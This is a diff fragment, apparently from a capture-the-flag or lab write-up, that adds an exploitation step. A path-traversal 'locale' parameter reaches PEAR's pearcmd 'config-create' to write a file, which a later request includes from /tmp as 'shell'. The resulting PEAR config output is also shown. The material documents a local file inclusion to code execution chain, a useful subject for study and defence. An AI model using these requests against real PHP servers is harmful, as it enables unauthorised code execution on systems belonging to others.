@@ -916,5 +916,24 @@ GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php
 
 Response after adding it:
 
+GET /locales/locale.json?locale=../../../../../tmp&namespace=shell HTTP/1.1
+
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/php";s:8:"data_dir";s:126:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/data";s:7:"www_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/www";s:7:"cfg_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/cfg";s:7:"ext_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/ext";s:7:"doc_dir";s:126:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/docs";s:8:"test_dir";s:127:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/tests";s:9:"cache_dir";s:127:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/cache";s:12:"download_dir";s:130:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/download";s:8:"temp_dir";s:126:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/temp";s:7:"bin_dir";s:121:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear";s:7:"man_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
+d800233670dcff936968e8dd03f52637/pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}
+```
+
+```
 
 ```
